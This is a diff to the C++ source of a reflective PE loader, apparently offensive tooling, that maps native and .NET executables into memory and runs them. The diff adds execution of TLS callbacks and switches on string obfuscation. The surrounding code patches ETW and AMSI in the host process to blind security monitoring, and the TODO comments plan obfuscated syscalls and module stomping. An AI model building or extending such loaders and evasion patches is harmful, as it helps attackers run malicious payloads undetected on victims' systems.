@@ -16,10 +16,11 @@
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
 		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
-// TODO: obfuscated syscalls for VirtualAlloc, CopyMemory, VirtualProtect, and VirtualFree ntdll functions
+// TODO: support TLS callbacks
 // TODO: Module Stomping 
+// TODO: obfuscated syscalls for VirtualAlloc, CopyMemory, VirtualProtect, LoadLibrary, and VirtualFree ntdll functions
 // TODO: native ExitThread function exits out of current process, hook this and fix
-// TODO: parse headers and allocate straight from HTTP download 
+// TODO: manually and recursively load DLL dependencies without LoadLibrary
 // TODO: find argv/argc get functions for other native C++ compilers, 
 //		 tested: cl.exe (non-multithreaded) __p__argvcan't seem to set load native memory to RW without voilation, possibly because memory is too close together and not on seperate pages?
 //		 untested: __getmainargs, __getcmdln, Environment.GetCommandLineArgs, changing PRTL_USER_PROCESS_PARAMETERS of PEB
@@ -150,6 +151,7 @@ typedef struct BASE_RELOCATION_ENTRY {
 } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
 // if image is allocated at preferred address, rebasing is not needed
+// rebasing modifies all absolute addresses to accomadate the non-preferred base address
 DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 	// get delta between current image base and the PE that was read into memory
 	DWORD_PTR deltaImageBase = (DWORD_PTR)peImageBase - (DWORD_PTR)ntHeader->OptionalHeader.ImageBase;
@@ -197,7 +199,7 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 			//VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), oldProtect, &oldProtect);
 
 			// debugging print
-			printf("Relocation Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
+			printf("[-] Relocation Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
 		}
 	}
 	return 0;
@@ -348,8 +350,13 @@ LPWSTR GetCommandLineWHook() {
 
 // import libraries, add function addresses to IAT, and hook commandline functions for masqurading
 DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, bool resolve) {
-	// resolve import address table for current process
+	// get import address table for current process
 	IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	if (importsDirectory.VirtualAddress == 0) {
+		printf("[-] PE does not contain any imports");
+		return 0;
+	}
+
 	// get first import descriptor in IAT
 	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
 	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)peImageBase);
@@ -366,8 +373,11 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 	while (importDescriptor->Name != NULL) {
 		// get library name and load into current process
 		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)peImageBase;
-		// note: full module PEs are loaded into process memory, export and import tables for specific module can also be read, not just current process
-		library = LoadLibraryA(libraryName);
+		library = GetModuleHandleA(libraryName);
+		if(library == nullptr){
+			// note: full module PEs are loaded into process memory, export and import tables for specific module can also be read, not just current process
+			library = LoadLibraryA(libraryName);
+		}
 
 		// resolve/find all thunks(function addresses/ordinals) and write them to importDescriptor
 		if (library) {
@@ -390,7 +400,7 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 						thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
 
 						// debugging print
-						printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
+						printf("[-] resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
 					}
 				} else {
 					if (resolve) {
@@ -420,7 +430,7 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 						thunk->u1.Function = functionAddress;
 
 						// debugging print
-						printf("resolving function %s -> %x\n", functionName->Name, functionAddress);
+						printf("[-] resolving function %s -> %x\n", functionName->Name, functionAddress);
 					}
 				}
 
@@ -463,7 +473,7 @@ IMAGE_NT_HEADERS* getNT(char* peBuffer) {
 
 DWORD setProtect(LPVOID peBuffer, IMAGE_NT_HEADERS* ntHeader){
 	// debug print
-	printf("setting permissions PAGE_READONLY on NT Header\n");
+	printf("[-] setting permissions PAGE_READONLY on NT Header\n");
 	// NT headers are read only (IAT and relocation table permissions will have to be modified during patching)
 	DWORD oldProtect, protectRes;
 	protectRes = VirtualProtect(peBuffer, ntHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);
@@ -521,13 +531,47 @@ DWORD setProtect(LPVOID peBuffer, IMAGE_NT_HEADERS* ntHeader){
 		}
 
 		// debugging print
-		printf("setting permissions %08x on %s\n", ulPermissions, sectionName);
+		printf("[-] setting permissions %08x on %s\n", ulPermissions, sectionName);
 		// set new permissions on memory
 		protectRes = VirtualProtect(sectionVA, sectionHeader[i].Misc.VirtualSize, ulPermissions, &ulPermissions);
 		if (protectRes == 0) {
 			printf("[!] Error modifying memory page protection: %d\n",GetLastError());
 		}
 	}
+
+	return 0;
+}
+
+// invokes Thread Local Storage callbacks
+DWORD runTLSCallbacks(LPVOID peBuffer, IMAGE_NT_HEADERS* ntHeader) {
+	// get TLS directory
+	IMAGE_DATA_DIRECTORY tlsDir =  ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+	if (tlsDir.VirtualAddress == 0) {
+		printf("[-] PE does not contain TLS callbacks functions\n");
+		return 0;
+	}
+
+	// get address of TLS directory in image and address of callbacks function address array
+	PIMAGE_TLS_DIRECTORY tlsAddress = (PIMAGE_TLS_DIRECTORY)(tlsDir.VirtualAddress + (DWORD)peBuffer);
+    DWORD_PTR* callbacksPtr = (DWORD_PTR*) tlsAddress->AddressOfCallBacks;
+	if (callbacksPtr == 0) {
+		printf("[-] TLS directory does not contain address callbacks\n");
+		return 0;
+	}
+
+	// enumerate over all callback function addresses in array and invoke each
+	// IMAGE_TLS_DIRECTORY32 does not contain a amount of functions, so must iterate till nullptr
+    while (callbacksPtr != nullptr) { 
+        DWORD_PTR callbackVA = *callbacksPtr; // get function address
+        if (callbackVA == 0) break;
+
+		printf("[-] Calling TLS callback: %08x\n", callbackVA);
+		// assign function address to function pointer and invoke
+        void(NTAPI * callbackFunc)(PVOID DllHandle, DWORD dwReason, PVOID) = (void(NTAPI*)(PVOID, DWORD, PVOID)) callbackVA;
+        callbackFunc(peBuffer, DLL_PROCESS_ATTACH, NULL);
+
+        callbacksPtr++;
+    }
 
 	return 0;
 }
@@ -569,7 +613,7 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	}
 
 	// debug print
-	printf("copying PE section NT Header (%p) -> %p\n", peBuffer, peImageBase);
+	printf("[-] copying PE section NT Header (%p) -> %p\n", peBuffer, peImageBase);
 	// copy image NT header to allocated memory
 	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
 
@@ -582,7 +626,7 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 		BYTE* sectionName = sectionHeader[i].Name;
 
 		// debugging print
-		printf("copying PE section %s (%p) -> %p\n", sectionName, sectionBuffer, sectionVA);
+		printf("[-] copying PE section %s (%p) -> %p\n", sectionName, sectionBuffer, sectionVA);
 		// copy PE section to virtual address
 		memcpy(
 			sectionVA, // destination: ImageBase + RVA = VA
@@ -619,6 +663,9 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	// set proper memory region protection
 	setProtect(peImageBase, ntHeader);
 
+	// run TLS Callbacks if any are included
+	runTLSCallbacks(peImageBase, ntHeader);
+
 	// get entry address
 	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
 	// execute PE
@@ -641,8 +688,11 @@ HRESULT loadCLR(ICorRuntimeHost** cLRHostPtr) {
 	// initialize Component Object Model library for use in thread
 	res = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
-	// check for CLR version
-	hMod = LoadLibraryA("mscoree.dll"); // LoadLibraryA is used incase program is compiled with delayed loading(lib not loaded till symbol is referenced)
+    hMod = GetModuleHandleA("mscoree.dll");
+    if(hMod == nullptr){
+		// check for CLR version
+		hMod = LoadLibraryA("mscoree.dll"); // LoadLibraryA is used incase program is compiled with delayed loading(lib not loaded till symbol is referenced)
+    }
 	//hMod = GetModuleHandleA("mscoree");
 	if (hMod == NULL) {
 		return E_FAIL;
@@ -865,9 +915,9 @@ DWORD patchETW(bool is32Bit = true) {
 	}
 
 	// hold string on .text segment (simply obfuscation)
-	//char modName[] = { 'n','t','e','l','l','\0' };
-	//modName[2] = 'd';
-	char* modName = (char *)"ntdll";
+	char modName[] = { 'n','t','e','l','l','\0' };
+	modName[2] = 'd';
+	//char* modName = (char *)"ntdll";
 
 	// !this check is pointless since ntdll is loaded in ever process!
 	// LoadLibraryA if it hasn't already been loaded
@@ -887,7 +937,7 @@ DWORD patchETW(bool is32Bit = true) {
 	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
 
 	// debugging print
-	printf("Patched EWT in host at %08x\n", (unsigned int)eventWrite);
+	printf("[-] Patched EWT in host at %08x\n", (unsigned int)eventWrite);
 
 	return 0;
 }
@@ -924,7 +974,7 @@ DWORD patchAMSI(bool is32Bit = true) {
 	VirtualProtect(sBuffAddr, patchSize, oldProt, &oldProt);
 
 	// debugging print
-	printf("Patched AMSI in host at %08x\n", (unsigned int)sBuffAddr);
+	printf("[-] Patched AMSI in host at %08x\n", (unsigned int)sBuffAddr);
 
 	return 0;
 }
@@ -959,7 +1009,7 @@ DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 		patchAMSI(false);
 	#endif
 
-	// check if PE is .NET
+	// check if PE is .NET, by checking for COM/.NET header
 	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
 		// .net doesn't need section loading for process memory, mscoree.lib handles this
 		loadManaged(peBuffer, len, argc, argv);
@@ -986,6 +1036,6 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
-	// call reflectiveLoader
+	// call reflectiveLoader (frees peBuffer)
 	reflectiveLoadPE(peBuffer, peSize, argc, argv);
 }
